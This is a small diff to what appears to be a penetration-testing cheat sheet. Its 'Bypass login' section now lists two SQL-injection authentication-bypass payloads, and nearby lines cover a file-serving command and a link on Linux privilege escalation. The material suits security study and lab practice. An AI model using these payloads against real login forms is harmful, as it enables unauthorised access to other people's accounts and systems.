@@ -8,7 +8,10 @@ python3 -m http.server
 ```
 
 ### Bypass login
-Try SQL injection in the login form. Pass this as user and password: `' or 1 = 1--`
+```
+' or 1 = 1--
+user'-- -
+```
 
 ### Enumeration
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
